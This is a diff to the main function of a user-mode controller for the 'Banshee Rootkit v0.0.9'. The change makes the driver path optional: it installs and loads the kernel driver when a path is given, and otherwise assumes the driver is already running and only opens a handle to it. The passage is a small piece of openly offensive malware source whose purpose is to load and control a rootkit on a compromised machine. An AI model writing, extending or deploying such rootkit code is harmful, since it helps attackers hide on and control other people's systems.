@@ -18,36 +18,43 @@ main(INT argc, CHAR *argv[])
     echo "|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n\n";
     std::cout << "Banshee Rootkit v0.0.9\n" << std::endl;
 
-    if (argc < 2)
-    {
-        LogError("Please specify the driver location");
-        return 1;
-    }
     auto banshee = Banshee();
-    std::string driverPath = argv[1];
 
-    BANSHEE_STATUS BeStatus = banshee.Install(driverPath);
-
-    LogInfo("Installing driver if not already installed...");
-    if (BeStatus != BE_SUCCESS)
+    if (argc >= 2)
     {
-        if (BeStatus == BE_ERR_DRIVER_NOT_EXISTS)
-        {
-            LogError("Driver does not exist at path " + driverPath + " ");
-        }
-        else
-        {
-            LogError("Error during install");
-        }
-        return 1;
-    }
-    LogInfo("Loading driver...");
-    if (banshee.Initialize() != BE_SUCCESS)
-    {
-        LogError("Error during initialization");
-        return 2;
-    }
+        std::string driverPath = argv[1];
+        BANSHEE_STATUS BeStatus = banshee.Install(driverPath);
 
+        LogInfo("Installing driver if not already installed...");
+        if (BeStatus != BE_SUCCESS)
+        {
+            if (BeStatus == BE_ERR_DRIVER_NOT_EXISTS)
+            {
+                LogError("Driver does not exist at path " + driverPath + " ");
+            }
+            else
+            {
+                LogError("Error during install");
+            }
+            return 1;
+        }
+        LogInfo("Loading driver...");
+        if (banshee.Initialize() != BE_SUCCESS)
+        {
+            LogError("Error during initialization");
+            return 2;
+        }
+    }
+    else
+    {
+        LogInfo("Driver location not specified. Assuming driver is loaded already...");
+        if (!banshee.InitDriverHandle())
+        {
+            LogError("Error during initialization: Could not get handle");
+            return 3;
+        }
+    }
+    
     // Main Loop
 
     BOOL shouldExit = false;
